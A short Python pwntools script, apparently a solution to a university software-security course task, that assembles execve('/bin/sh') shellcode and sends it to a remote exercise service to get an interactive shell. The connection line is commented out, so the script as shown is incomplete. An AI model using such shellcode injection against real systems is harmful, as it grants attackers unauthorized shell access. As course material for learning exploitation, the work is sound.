#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
#conn = pwn.remote('tasks.ws24.softsec.rub.de', 32885)

# shellcode from the slides
shellcode = pwn.asm('''
    mov rax, 59;
    lea rdi, [rip + sh];
    mov rsi, 0;
    mov rdx, 0;
    syscall;
    ret;
sh:
    .string "/bin/sh"
''')

print(f'shellcode: {shellcode.hex()}')
conn.recvuntil(b'please enter your (hex-encoded) shellcode, at most 4096 bytes:')
conn.sendline(shellcode.hex().encode())
conn.interactive()
